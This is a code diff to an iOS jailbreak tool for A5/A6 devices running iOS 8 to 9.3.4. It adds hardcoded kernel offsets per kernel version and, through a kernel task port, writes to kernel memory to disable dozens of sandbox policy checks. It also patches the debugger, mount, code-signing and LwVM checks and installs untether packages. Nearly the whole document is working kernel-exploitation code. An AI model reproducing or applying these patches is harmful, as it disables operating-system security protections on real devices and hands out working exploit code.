@@ -22,8 +22,7 @@ uint32_t pmaps[TTB_SIZE];
 int pmapscnt = 0;
 
 bool isA5orA5X(void) {
-    //NSLog(@"%@", nkernv);
-    if([nkernv containsString:@"S5L894"]) {
+    if(strstr(ckernv, "S5L894")) {
         printf("A5(X) device\n");
         return true;
     }
@@ -57,60 +56,55 @@ void copyout(uint32_t to, void* from, size_t size, task_t tfp0) {
 
 uint32_t find_kernel_pmap(uintptr_t kernel_base) {
     uint32_t pmap_addr;
+
     if(isA5orA5X()) {
-        //A5 or A5X
-        if ([nkernv containsString:@"3248.1."] || [nkernv containsString:@"3247.1.88"]) { //9.0-9.0.2
+        printf("A5(X) ");
+        if (strstr(ckernv, "3248.6") || strstr(ckernv, "3248.5") || strstr(ckernv, "3248.4")) {
+            printf("9.3-9.3.4\n");
+            pmap_addr = 0x3f6454;
+        } else if (strstr(ckernv, "3248.31") || strstr(ckernv, "3248.21")) {
+            printf("9.2-9.2.1\n");
+            pmap_addr = 0x3ef444;
+        } else if (strstr(ckernv, "3248.10")) {
+            printf("9.1\n");
+            pmap_addr = 0x3f8444;
+        } else if (strstr(ckernv, "3248.1.") || strstr(ckernv, "3247.1.88")) {
             printf("9.0-9.0.2\n");
             pmap_addr = 0x3f7444;
-        } else if ([nkernv containsString:@"3247.1.56"]) { //9.0b4
-            printf("9.0b4\n");
-            pmap_addr = 0x3f5448;
-        } else if ([nkernv containsString:@"3247.1.36"]) { //9.0b3
-            printf("9.0b3\n");
-            pmap_addr = 0x3f6448;
-        } else if ([nkernv containsString:@"3247.1.6"]) { //9.0b2
-            printf("9.0b2\n");
-            pmap_addr = 0x3fb45c;
-        } else if ([nkernv containsString:@"3216"]) { //9.0b1
-            printf("9.0b1\n");
-            pmap_addr = 0x3f8454;
-        } else if ([nkernv containsString:@"2784"]) { //8.3-8.4.1
+        } else if (strstr(ckernv, "2784")) {
             printf("8.3-8.4.1\n");
             pmap_addr = 0x3a211c;
-        } else if ([nkernv containsString:@"2783.5"]) { //8.2
+        } else if (strstr(ckernv, "2783.5")) {
             printf("8.2\n");
             pmap_addr = 0x39411c;
-        } else if ([nkernv containsString:@"2783.3.26"]) { //8.1.3
+        } else if (strstr(ckernv, "2783.3.26")) {
             printf("8.1.3\n");
             pmap_addr = 0x39211c;
-        } else { //8.0-8.1.2
+        } else {
             printf("8.0-8.1.2\n");
             pmap_addr = 0x39111c;
         }
     } else {
-        //A6 or A6X
-        if ([nkernv containsString:@"3248.1."] || [nkernv containsString:@"3247.1.88"]) { //9.0-9.0.2
+        printf("A6(X) ");
+        if (strstr(ckernv, "3248.6") || strstr(ckernv, "3248.5") || strstr(ckernv, "3248.4")) {
+            printf("9.3-9.3.4\n");
+            pmap_addr = 0x3fe454;
+        } else if (strstr(ckernv, "3248.31") || strstr(ckernv, "3248.21")) {
+            printf("9.2-9.2.1\n");
+            pmap_addr = 0x3f6444;
+        } else if (strstr(ckernv, "3248.10")) {
+            printf("9.1\n");
+            pmap_addr = 0x3ff444;
+        } else if (strstr(ckernv, "3248.1.") || strstr(ckernv, "3247.1.88")) {
             printf("9.0-9.0.2\n");
             pmap_addr = 0x3fd444;
-        } else if ([nkernv containsString:@"3247.1.56"]) { //9.0b4
-            printf("9.0b4\n");
-            pmap_addr = 0x3fc448;
-        } else if ([nkernv containsString:@"3247.1.36"]) { //9.0b3
-            printf("9.0b3\n");
-            pmap_addr = 0x3fe448;
-        } else if ([nkernv containsString:@"3247.1.6"]) { //9.0b2
-            printf("9.0b2\n");
-            pmap_addr = 0x40345c;
-        } else if ([nkernv containsString:@"3216"]) { //9.0b1
-            printf("9.0b1\n");
-            pmap_addr = 0x3ff454;
-        } else if ([nkernv containsString:@"2784"]) { //8.3-8.4.1
+        } else if (strstr(ckernv, "2784")) {
             printf("8.3-8.4.1\n");
             pmap_addr = 0x3a711c;
-        } else if ([nkernv containsString:@"2783.5"]) { //8.2
+        } else if (strstr(ckernv, "2783.5")) {
             printf("8.2\n");
             pmap_addr = 0x39a11c;
-        } else { //8.0-8.1.3
+        } else {
             printf("8.0-8.1.3\n");
             pmap_addr = 0x39711c;
         }
@@ -119,24 +113,27 @@ uint32_t find_kernel_pmap(uintptr_t kernel_base) {
     return pmap_addr + kernel_base;
 }
 
-// debugger 1 and 2 for a5(x) 9.0.x
+// debugger 1 and 2 for a5(x) 9.x
 uint32_t find_PE_i_can_has_debugger_1(void) {
     uint32_t PE_i_can_has_debugger_1;
-    if ([nkernv containsString:@"3247.1.88"]) { //9.0b5
-        printf("9.0b5\n");
-        PE_i_can_has_debugger_1 = 0x3a8f44;
-    } else if ([nkernv containsString:@"3247.1.56"]) { //9.0b4
-        printf("9.0b4\n");
-        PE_i_can_has_debugger_1 = 0x3a7394;
-    } else if ([nkernv containsString:@"3247.1.36"]) { //9.0b3
-        printf("9.0b3\n");
-        PE_i_can_has_debugger_1 = 0x3a8444;
-    } else if ([nkernv containsString:@"3247.1.6"]) { //9.0b2
-        printf("9.0b2\n");
-        PE_i_can_has_debugger_1 = 0x3ad524;
-    } else if ([nkernv containsString:@"3216"]) { //9.0b1
-        printf("9.0b1\n");
-        PE_i_can_has_debugger_1 = 0x45ad20;
+    if (strstr(ckernv, "3248.60")) {
+        printf("9.3.3-9.3.4\n");
+        PE_i_can_has_debugger_1 = 0x3a82d4;
+    } else if (strstr(ckernv, "3248.50")) {
+        printf("9.3.2\n");
+        PE_i_can_has_debugger_1 = 0x3a7ff4;
+    } else if (strstr(ckernv, "3248.41")) {
+        printf("9.3-9.3.1\n");
+        PE_i_can_has_debugger_1 = 0x3a7ea4;
+    } else if (strstr(ckernv, "3248.31")) {
+        printf("9.2.1\n");
+        PE_i_can_has_debugger_1 = 0x3a1434;
+    } else if (strstr(ckernv, "3248.21")) {
+        printf("9.2\n");
+        PE_i_can_has_debugger_1 = 0x3a12c4;
+    } else if (strstr(ckernv, "3248.10")) {
+        printf("9.1\n");
+        PE_i_can_has_debugger_1 = 0x3aa734;
     } else {
         printf("9.0-9.0.2\n");
         PE_i_can_has_debugger_1 = 0x3a8fc4;
@@ -146,21 +143,18 @@ uint32_t find_PE_i_can_has_debugger_1(void) {
 
 uint32_t find_PE_i_can_has_debugger_2(void) {
     uint32_t PE_i_can_has_debugger_2;
-    if ([nkernv containsString:@"3247.1.56"]) { //9.0b4
-        printf("9.0b4\n");
-        PE_i_can_has_debugger_2 = 0x3ae364;
-    } else if ([nkernv containsString:@"3247.1.36"]) { //9.0b3
-        printf("9.0b3\n");
-        PE_i_can_has_debugger_2 = 0x3b01a4;
-    } else if ([nkernv containsString:@"3247.1.6"]) { //9.0b2
-        printf("9.0b2\n");
-        PE_i_can_has_debugger_2 = 0x3b4b94;
-    } else if ([nkernv containsString:@"3216"]) { //9.0b1
-        printf("9.0b1\n");
-        PE_i_can_has_debugger_2 = 0x461e40;
+    if (strstr(ckernv, "3248.6") || strstr(ckernv, "3248.5") || strstr(ckernv, "3248.4")) {
+        printf("9.3.x\n");
+        PE_i_can_has_debugger_2 = 0x456070;
+    } else if (strstr(ckernv, "3248.31") || strstr(ckernv, "3248.21")) {
+        printf("9.2-9.2.1\n");
+        PE_i_can_has_debugger_2 = 0x44f070;
+    } else if (strstr(ckernv, "3248.10")) {
+        printf("9.1\n");
+        PE_i_can_has_debugger_2 = 0x457860;
     } else {
         printf("9.0-9.0.2\n");
-        PE_i_can_has_debugger_2 = 0x3af014;
+        PE_i_can_has_debugger_2 = 0x4567d0;
     }
     return PE_i_can_has_debugger_2;
 }
@@ -322,14 +316,14 @@ void patch_kernel(mach_port_t tfp0, uint32_t kernel_base) {
     kdata = malloc(ksize);
     dump_kernel(tfp0, kernel_base, kdata, ksize);
     if (!kdata) {
-        printf("fuck\n");
+        printf("f\n");
         exit(1);
     }
     printf("now...\n");
     
     uint32_t sbopsoffset = find_sbops(kernel_base, kdata, ksize);
 
-    printf("nuking sandbox at 0x%08lx\n", kernel_base + sbopsoffset);
+    printf("nuking sandbox\n");
     wk32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl), 0,tfp0);
     wk32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_access), 0,tfp0);
     wk32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_create), 0,tfp0);
@@ -518,7 +512,7 @@ void patch_kernel_90(mach_port_t tfp0, uint32_t kbase){
 
     printf("[*] running kdumper\n");
     uint8_t* kdata = NULL;
-    size_t ksize = 0xF00000;
+    size_t ksize = 0xFFE000;
     kdata = malloc(ksize);
     dump_kernel(tfp0, kbase, kdata, ksize);
     if (!kdata) {
@@ -535,8 +529,6 @@ void patch_kernel_90(mach_port_t tfp0, uint32_t kbase){
     uint32_t vm_fault_enter = kbase + find_vm_fault_enter_patch(kbase, kdata, ksize);
     uint32_t vm_map_enter = kbase + find_vm_map_enter_patch8(kbase, kdata, ksize);
     uint32_t vm_map_protect = kbase + find_vm_map_protect_patch(kbase, kdata, ksize);
-    uint32_t mount_patch = kbase + find_mount_90(kbase, kdata, ksize) + 1;
-    uint32_t mapForIO = kbase + find_mapForIO(kbase, kdata, ksize);
     uint32_t sandbox_call_i_can_has_debugger = kbase + find_sandbox_call_i_can_has_debugger8(kbase, kdata, ksize);
     uint32_t sb_patch = kbase + find_sb_evaluate_90(kbase, kdata, ksize);
     uint32_t memcmp_addr = find_memcmp8(kbase, kdata, ksize);
@@ -545,6 +537,10 @@ void patch_kernel_90(mach_port_t tfp0, uint32_t kbase){
     uint32_t amfi_file_check_mmap = kbase + find_amfi_file_check_mmap(kbase, kdata, ksize);
     uint32_t PE_i_can_has_debugger_1;
     uint32_t PE_i_can_has_debugger_2;
+    uint32_t mount_patch;
+    uint32_t mapForIO;
+    uint32_t i_can_has_kernel_configuration_got;
+    uint32_t lwvm_jump;
 
     if (isA5orA5X()) {
         PE_i_can_has_debugger_1 = kbase + find_PE_i_can_has_debugger_1();
@@ -552,6 +548,22 @@ void patch_kernel_90(mach_port_t tfp0, uint32_t kbase){
     } else {
         PE_i_can_has_debugger_1 = kbase + find_i_can_has_debugger_1_90(kbase, kdata, ksize);
         PE_i_can_has_debugger_2 = kbase + find_i_can_has_debugger_2_90(kbase, kdata, ksize);
+    }
+
+    if (strstr(ckernv, "3248.1.")) {
+        mount_patch = kbase + find_mount_90(kbase, kdata, ksize);
+    } else {
+        mount_patch = kbase + find_mount(kbase, kdata, ksize);
+    }
+
+    if (strstr(ckernv, "3248.6") || strstr(ckernv, "3248.5") || strstr(ckernv, "3248.4")) {
+        i_can_has_kernel_configuration_got = kbase + find_PE_i_can_has_kernel_configuration_got(kbase, kdata, ksize);
+        lwvm_jump = kbase + find_lwvm_jump(kbase, kdata, ksize);
+        printf("[PF] i_can_has_kernel_configuration_got: %08x\n", i_can_has_kernel_configuration_got);
+        printf("[PF] lwvm_jump:                  %08x\n", lwvm_jump);
+    } else {
+        mapForIO = kbase + find_mapForIO(kbase, kdata, ksize);
+        printf("[PF] mapForIO:                   %08x\n", mapForIO);
     }
 
     printf("[PF] proc_enforce:               %08x\n", proc_enforce);
@@ -563,7 +575,6 @@ void patch_kernel_90(mach_port_t tfp0, uint32_t kbase){
     printf("[PF] vm_map_enter:               %08x\n", vm_map_enter);
     printf("[PF] vm_map_protect:             %08x\n", vm_map_protect);
     printf("[PF] mount_patch:                %08x\n", mount_patch);
-    printf("[PF] mapForIO:                   %08x\n", mapForIO);
     printf("[PF] sb_call_i_can_has_debugger: %08x\n", sandbox_call_i_can_has_debugger);
     printf("[PF] sb_evaluate:                %08x\n", sb_patch);
     printf("[PF] memcmp:                     %08x\n", memcmp_addr);
@@ -605,11 +616,19 @@ void patch_kernel_90(mach_port_t tfp0, uint32_t kbase){
 
     /* mount patch */
     printf("[*] mount patch\n");
-    wk8(mount_patch, 0xe7, tfp0);
+    if (strstr(ckernv, "3248.1.")) {
+        wk8(mount_patch, 0xe7, tfp0);
+    } else {
+        wk8(mount_patch, 0xe0, tfp0);
+    }
 
     /* mapForIO: prevent kIOReturnLockedWrite error */
     printf("[*] mapForIO\n");
-    wk32(mapForIO, 0xbf00bf00, tfp0);
+    if (strstr(ckernv, "3248.6") || strstr(ckernv, "3248.5") || strstr(ckernv, "3248.4")) {
+        wk32(i_can_has_kernel_configuration_got, lwvm_jump, tfp0);
+    } else {
+        wk32(mapForIO, 0xbf00bf00, tfp0);
+    }
 
     /* csops */
     printf("[*] csops\n");
@@ -672,13 +691,49 @@ void patch_kernel_90(mach_port_t tfp0, uint32_t kbase){
     void* sandbox_payload = malloc(payload_len);
     memcpy(sandbox_payload, pangu9_payload, payload_len);
 
-    // hook sb_evaluate
-    printf("[*] sb_evaluate\n");
-    copyout((kbase + payload_base), sandbox_payload, payload_len, tfp0);
-
-    printf("[*] sb_evaluate_hook\n");
-    uint32_t sb_evaluate_hook = make_b_w((sb_patch-kbase), payload_base);
-    wk32(sb_patch, sb_evaluate_hook, tfp0);
+    if (strstr(ckernv, "3248.1")) { // 9.0-9.1
+        // hook sb_evaluate
+        printf("[*] sb_evaluate\n");
+        copyout((kbase + payload_base), sandbox_payload, payload_len, tfp0);
+        printf("[*] sb_evaluate_hook\n");
+        uint32_t sb_evaluate_hook = make_b_w((sb_patch-kbase), payload_base);
+        wk32(sb_patch, sb_evaluate_hook, tfp0);
+    } else { // 9.2-9.3.4
+        uint32_t sbopsoffset = kbase + find_sbops(kbase, kdata, ksize);
+        printf("nuking sandbox\n");
+        wk32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_rename), 0,tfp0);
+        wk32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_access), 0,tfp0);
+        wk32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_chroot), 0,tfp0);
+        wk32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_create), 0,tfp0);
+        wk32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_file_check_mmap), 0,tfp0);
+        wk32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr), 0,tfp0);
+        wk32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata), 0,tfp0);
+        wk32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_exec), 0,tfp0);
+        wk32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist), 0,tfp0);
+        wk32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr), 0,tfp0);
+        wk32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl), 0,tfp0);
+        wk32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_link), 0,tfp0);
+        wk32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr), 0,tfp0);
+        wk32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_open), 0,tfp0);
+        wk32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_readlink), 0,tfp0);
+        wk32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist), 0,tfp0);
+        wk32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr), 0,tfp0);
+        wk32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setflags), 0,tfp0);
+        wk32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setmode), 0,tfp0);
+        wk32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setowner), 0,tfp0);
+        wk32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0,tfp0);
+        wk32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0,tfp0);
+        wk32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_stat), 0,tfp0);
+        wk32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_truncate), 0,tfp0);
+        wk32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_unlink), 0,tfp0);
+        wk32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_notify_create), 0,tfp0);
+        wk32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath), 0,tfp0);
+        wk32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getattr), 0,tfp0);
+        wk32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_mount_check_stat), 0,tfp0);
+        wk32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_proc_check_fork), 0,tfp0);
+        wk32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_iokit_check_get_property), 0,tfp0);
+        wk32(sbopsoffset + offsetof(struct mac_policy_ops, mpo_cred_label_update_execve), 0,tfp0);
+    }
 
     printf("[*] patch tfp0\n");
     uint32_t tfp0_patch = kbase + find_tfp0_patch(kbase, kdata, ksize);
@@ -777,15 +832,15 @@ void postjailbreak(bool untether_on) {
     }
 
     if (untether_on) {
-        if ([nkernv containsString:@"3248"] || [nkernv containsString:@"3247"] || [nkernv containsString:@"3216"] ||
-            [nkernv containsString:@"2784.30"] || (isA5orA5X() && [nkernv containsString:@"2783"])) {
-            // all 9.0.x, 8.4, a5(x) 8.0-8.2
+        if (strstr(ckernv, "3248") || strstr(ckernv, "3247") ||
+            strstr(ckernv, "2784.30") || (isA5orA5X() && strstr(ckernv, "2783"))) {
+            // all 9.x, 8.4, a5(x) 8.0-8.2
             printf("extracting everuntether\n");
             run_tar(getFilePath("everuntether.tar"));
         } else {
             // a6(x) 8.x, a5(x) 8.3-8.4.1
             printf("extracting daibutsu untether\n");
-            run_tar("%s", getFilePath("untether.tar"));
+            run_tar(getFilePath("untether.tar"));
         }
         printf("running postinst\n");
         run_cmd("/bin/bash /private/var/tmp/postinst configure");
